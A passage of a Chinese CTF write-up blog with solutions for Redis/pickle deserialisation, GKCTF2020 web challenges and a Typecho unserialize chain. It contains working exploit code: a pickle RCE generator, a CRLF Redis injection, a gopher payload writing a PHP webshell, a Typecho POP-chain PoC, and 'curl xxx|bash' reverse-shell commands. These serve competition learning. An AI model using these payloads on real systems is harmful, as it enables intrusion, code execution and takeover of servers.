class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> sipder <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> StrictRedis</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, redirect, session, request, make_response, url_for, abort, render_template_string</span><br><span class="line"><span class="keyword">from</span> user <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="number">6379</span>,db=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">"Cookie"</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"login"</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">'GET'</span>:</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        cookie = Cookie()</span><br><span class="line">        cookie.create = username</span><br><span class="line">        cookie = cookie.create</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> redis.exists(cookie):</span><br><span class="line">                user = pickle.loads(redis.get(cookie))</span><br><span class="line">                <span class="keyword">if</span> user.verify_pass(password):</span><br><span class="line">                    resp = make_response(redirect(url_for(<span class="string">'home'</span>)))</span><br><span class="line">                    resp.set_cookie(<span class="string">'Cookie'</span>,cookie)</span><br><span class="line">                    <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/register/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">'GET'</span>:</span><br><span class="line">        email = request.form.get(<span class="string">'email'</span>)</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        user = User(email,username,password)</span><br><span class="line">        cookie = Cookie()</span><br><span class="line">        cookie.create = username</span><br><span class="line">        cookie = cookie.create</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> redis.exists(cookie):</span><br><span class="line">                redis.set(cookie,pickle.dumps(user))</span><br><span class="line">                resp = make_response(redirect(url_for(<span class="string">'home'</span>)))</span><br><span class="line">                resp.set_cookie(<span class="string">"Cookie"</span>,cookie)</span><br><span class="line">                <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"register.html"</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/home/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'Cookie'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> Cookie.verify(cookie) <span class="keyword">and</span> redis.exists(cookie):</span><br><span class="line">            user = redis.get(cookie)</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            <span class="keyword">if</span> request.method != <span class="string">"GET"</span>:</span><br><span class="line">                formlist = request.form.to_dict()</span><br><span class="line">                User.modify_info(user,formlist)</span><br><span class="line">                redis.set(cookie,pickle.dumps(user))</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>,user=user)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>,user=user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"login"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/spider/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'Cookie'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> Cookie.verify(cookie) <span class="keyword">and</span> redis.exists(cookie):</span><br><span class="line">            user = redis.get(cookie)</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">500</span>)</span><br><span class="line">    result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">elif</span> request.method != <span class="string">"GET"</span> <span class="keyword">and</span> request.form.get(<span class="string">'url'</span>)!=<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target_url = request.form.get(<span class="string">'url'</span>)</span><br><span class="line">            new_spider = Spider(target_url)</span><br><span class="line">            result = new_spider.spiderFlag()</span><br><span class="line">        <span class="keyword">except</span> Excetion <span class="keyword">as</span> e:</span><br><span class="line">            result = e</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"spider.html"</span>,result=str(result),user=user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/testSpider/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TSpider</span><span class="params">()</span>:</span></span><br><span class="line">    html = <span class="string">'&lt;div id="flag"&gt;Flag&#123;hahaha This is a test for tested Spider mode&#125;&lt;/div&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(redirect(url_for(<span class="string">'login'</span>)))</span><br><span class="line">    resp.set_cookie(<span class="string">'Cookie'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"error.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        port=<span class="number">5000</span>,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>从调用的包看到还有两个自定义的包。也一并读下来、<br>sipder.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.target_url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getResponse</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = urllib.request.urlopen(self.target_url).read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            <span class="keyword">return</span> (info, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="keyword">return</span> (err, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spiderFlag</span><span class="params">(self)</span>:</span></span><br><span class="line">        infos = self.__getResponse()</span><br><span class="line">        <span class="keyword">if</span> infos[<span class="number">1</span>]:</span><br><span class="line">            soup = BeautifulSoup(infos[<span class="number">0</span>])</span><br><span class="line">            flag = soup.find(id==<span class="string">'flag'</span>)</span><br><span class="line">            <span class="keyword">return</span> infos[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> flag.text</span><br><span class="line">        <span class="keyword">return</span> infos[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>user.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">-*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="comment"># here put the import lib</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,email,username,password)</span>:</span></span><br><span class="line">        self.email = email</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = md5(password.encode(encoding=<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line">        self.phone = <span class="literal">None</span></span><br><span class="line">        self.qqnumber = <span class="literal">None</span></span><br><span class="line">        self.intro = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_pass</span><span class="params">(self,password)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> password <span class="keyword">and</span> md5(password.encode(encoding=<span class="string">'utf8'</span>)).hexdigest() == self.password:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modify_info</span><span class="params">(obj,dict)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> dict:</span><br><span class="line">            <span class="keyword">if</span> hasattr(obj,key) <span class="keyword">and</span> dict[key]!=<span class="string">''</span>:</span><br><span class="line">                setattr(obj,key,dict[key])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cookie</span><span class="params">(object)</span>:</span></span><br><span class="line">    __key = <span class="string">"abcd"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        __key = <span class="string">"abcd"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.mix_str = (self.username+Cookie.__key).encode(encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        self.md5_str = self.username+md5(self.mix_str).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> self.md5_str</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @create.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self,username)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(verify_cookie)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> verify_cookie:</span><br><span class="line">            username = verify_cookie[:<span class="number">-32</span>]</span><br><span class="line">            verify_str = verify_cookie[<span class="number">-32</span>:]</span><br><span class="line">            <span class="keyword">return</span> md5((username+Cookie.__key).encode(encoding=<span class="string">"utf8"</span>)).hexdigest()==verify_str</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>这里主要得到两个信息。redis无密码。且是用来存储cookie的。而cookie的值会被调用出来进行pickle的反序列化。</p><p>不用说，我们也大致明白思路了：操作redis修改cookie键对应的值。用cookie刷新触发反序列化RCE。<br>这个考点在去年的swpuctf的web2中也出现过。可惜自己因为环境问题一直没能在buu上做。</p><p>这里基于源码比较齐全。我就本地简单搭建了一个server。然后触发一个生成cookie存储的过程。看看大致的存储规律<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/3.PNG" alt><br>实际上就是以我们的cookie作为键，pickle的opcode作为值，比flask的默认存储直观很多。</p><p>那么很简单了，我们生成下RCE代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">"__import__('os').system('echo `ls /` &gt; /tmp/byc')"</span>,))</span><br><span class="line">a = exp()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>这里为了不给服务器带来困扰，直接把根目录ls的结果写到tmp目录下，然后我们就能用读文件的途径直接读了。</p><p>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aset &quot;byc40418e2b681af1051d6fcb32e3d3f7071f6&quot; &quot;\x80\x03cbuiltins\neval\nq\x00X7\x00\x00\x00__import__(&#39;os&#39;).system(&#39;echo &#96;ls &#x2F;&#96; &gt; &#x2F;tmp&#x2F;byc4&#39;)q\x01\x85q\x02Rq\x03.&quot;%0d%0apadding</span><br></pre></td></tr></table></figure><p>开始我在担心编码问题。后来发现应该不用在意。直接用python3的opcode结果就可以了。<br>刷新下cookie对应页面,然后读文件<code>file:///tmp/byc4</code><br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/4.PNG" alt></p><p>接下来就可以直接读flag了。当然后面我试了下直接用<code>curl xxx|bash</code>弹个shell也是可以的。方法有很多。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>两道题都算是php与redis以及python与redis的经典搭配了。当然redis的利用还有很多，以后会慢慢学习。</p><p>然后RCTF险些爆零……calc这题真的是太考验基本功了。做的人心累。</p><p>最后就要收心好好复习了。这学期大部分时间都花在了ctf上，课业不像以往那样心里有底了。感觉得好好复习一把。现在CTF马上也快打一年了，自己很高兴水平比以往要高了不少。但是自己作为x1c的web手，还是感觉实力跟别的强队相比差了不少。希望暑假能好好研究下自己想学的东西,尽量过的充实点吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020writeup</title>
      <link href="2020/05/24/GKCTF2020writeup/"/>
      <url>2020/05/24/GKCTF2020writeup/</url>
      
        <content type="html"><![CDATA[<p>这周末打了两个比赛。BJDCTF3rd与GKCTF.这里个人认为GKCTF的题目收获挺多的,但是时间太紧，自己也在简单题上浪费了不少时间。所以把比赛时没来的及看或者没做出来的题都补全。</p><a id="more"></a><h2 id="check-in"><a href="#check-in" class="headerlink" title="check_in"></a>check_in</h2><p>题目给出了源码。基本机理就是从<code>$_REQUEST</code>里获取Ginkgo变量然后eval执行。<br>phpinfo()的话会发现存在<code>disable_function</code>,列目录会发现根目录有readflag.<br>但是不要紧。我们有bypass脚本用,下面就是之前做buu上一道<code>l33t-hoster</code>的脚本拿来改的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://5e0893e9-0a1c-4836-8865-2771c87a52e4.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">"Ginkgo"</span>:base64.b64encode(payload.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)&#125;</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"move_uploaded_file($_FILES['file']['tmp_name'],'/tmp/exploit.php');echo 'ok';var_dump(scandir('/tmp'));"</span></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'exploit.php'</span>,open(<span class="string">"exploit.php"</span>,<span class="string">"rb"</span>),<span class="string">'application/octet-stream'</span>))]</span><br><span class="line">r = requests.post(url=url,data=command(payload),files=files)</span><br><span class="line">r=requests.post(url=url,data=command(<span class="string">'include("/tmp/exploit.php");'</span>))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>脚本要传到<code>/tmp</code>下,否则其他目录应该是不可写的。然后包含即可。</p><h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>这题说实话挺简单的。就是手慢了几步。<br>首先后台getshell不讲了,主要是按照网上能搜到的<br>ShopXO全版本getshell流程走：先默认密码登录后台,下载主题并加上webshellbyc.php,再重新上传zip文件,访问<code>/public/static/index/default/byc.php</code>即可.</p><p>拿到www-data的shell后发现需要提权。然后根目录<code>flag.hint</code>里给了个日期.不过我并没有怎么在意这个日期,而是按照自己htb渗透的习惯来.</p><p>首先理论上应该来个扫描脚本的。不过这里很明显就能在根目录<code>ls -la</code>时发现<code>auto.sh</code>是root用户运行一个python脚本，每一分钟执行一次。找到python脚本后发现有写的权限。</p><p>那就很简单了,直接写入命令<code>import os;os.system(&#39;curl xxx|bash&#39;)</code><br>(这里之前为了弹www-data的shell提前准备好了反弹脚本)然后等待监听的端口返回rootshell即可。flag在root目录下</p><h2 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h2><p>这题二血。算是比较有意思的题目。</p><p>首先会发现首页功能似乎是个ssrf。然后还给出了<code>?secret</code>参数看ip地址.<br>不过其实这里并不需要给ip的,因为可以直接读<code>/etc/hosts</code></p><p>当然,想要常规的file协议读肯定是不行的.但是它过滤的不严，可以用类似xxe里利用file协议列目录的方式来读<br><code>file:/var/www/html/index.php</code><br>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">        <span class="comment">//echo $url."\n";</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span>, $url,$match))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//var_dump($match);</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'别这样'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'secret'</span>]))&#123;</span><br><span class="line">    system(<span class="string">'ifconfig'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不过flag并不在本机173.92.140.13。实际上这种方式想读根目录也并不可行。但基于这里是个curl的ssrf。那么就大有可为。<br>不过这一步浪费了不少时间,后面才反应过来可以顺着探内网。<br>尝试直接顺着ip探内网存活主机,发现173.92.140.13,提示其他端口,猜测是redis或者mysql之类的。<br>于是探6379端口得到redis的报错命令。那么基本可以确认是gopher协议利用ssrf打redis未授权getshell了。<br>可以看这篇文章<a href="https://xz.aliyun.com/t/1800" target="_blank" rel="noopener">Redis和SSRF</a></p><p>命令的构建主要是编码问题。把命令进行正确编码就能打了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;173.92.140.13:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure><p>这样就在140.13那写入webshell。然后直接<code>173.92.140.13/shell.php?cmd=cat%20/flag</code>即可</p><h2 id="EZ三剑客-EzTypecho"><a href="#EZ三剑客-EzTypecho" class="headerlink" title="EZ三剑客-EzTypecho"></a>EZ三剑客-EzTypecho</h2><p>这题真的可惜。比赛时因为其他题目没来得及看。结果发现基本就是原本的链子加上一个bypass就行了。</p><p>先来过下源码。关于typeecho的洞出在install.php算是比较熟知的了。所以网上基本两个版本的POP链。如果有install.php就可以按第一个的思路走。<br>首先这里的源码表明必须get<code>finish</code>参数以及带上Referer才不会退出。<br><img src="/2020/05/24/GKCTF2020writeup/1.PNG" alt></p><p>接下来是反序列化点<br><img src="/2020/05/24/GKCTF2020writeup/2.PNG" alt><br>这里实际上只加上了一个session的判断。如果以前有现成的pocbypass了这个判断就能直接打了。这里自己先按照链子跟一下。</p><p>上面我们的序列化数据被送进实例化了一个Typeecho_Db类里。跟进下<br>发现构造方法调用了<code>call_user_func()</code><br><img src="/2020/05/24/GKCTF2020writeup/3.PNG" alt><br>然后call_user_func的参数<code>$adapterName</code>有一个字符串拼接。那说明可以触发<code>__toString</code>.我们全局找下<code>__toString</code><br>找到<code>var\Typecho\Feed.php</code><br>其魔术方法中有这样一段<br><img src="/2020/05/24/GKCTF2020writeup/4.PNG" alt><br>这里item是遍历<code>items</code>得来的。而items可控。并且由于箭头所指位置调用了<code>screenname</code>属性。因此可能可以触发<code>__get</code>方法<br>全局搜找到<code>var\Typecho\Request.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而get是<br><img src="/2020/05/24/GKCTF2020writeup/5.PNG" alt><br>我们上面要触发<code>__get</code>,是因为调用了<code>screneName</code>属性。那么触发get的话就是对应了<code>$key</code>。可以看到最后被送进<code>_applyFilter</code>的参数值来自<code>params[$key]</code>仍然是可控的<br>最后就是跟进函数了。发现调用<code>call_user_func</code>可以命令执行。参数可控。所以链子到此结束。<br><img src="/2020/05/24/GKCTF2020writeup/6.PNG" alt></p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'cat /flag'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'system'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items=<span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">"author"</span>=&gt;<span class="keyword">new</span> Typecho_Request()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$config=<span class="keyword">array</span>(<span class="string">"adapter"</span>=&gt;<span class="keyword">new</span> Typecho_Feed(),<span class="string">"prefix"</span>=&gt;<span class="string">'byc'</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($config));</span><br><span class="line"><span 